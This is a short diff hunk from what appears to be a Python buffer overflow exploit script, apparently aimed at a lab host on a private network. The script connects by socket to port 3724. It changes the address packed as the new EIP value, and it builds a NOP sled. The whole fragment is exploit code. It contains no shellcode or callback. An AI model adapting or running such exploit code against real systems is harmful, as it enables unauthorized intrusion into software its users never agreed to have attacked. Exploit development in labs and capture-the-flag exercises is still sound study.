@@ -9,7 +9,7 @@ s = socket.socket()
 s.connect(("192.168.122.216", 3724))
 
 # new_eip = struct.pack("<I", 0x00401489)
-new_eip = struct.pack("<I", 0x0804937a)
+new_eip = struct.pack("<I", 0x0804956e)
 
 nop_sled = b"\x90" * 32
 
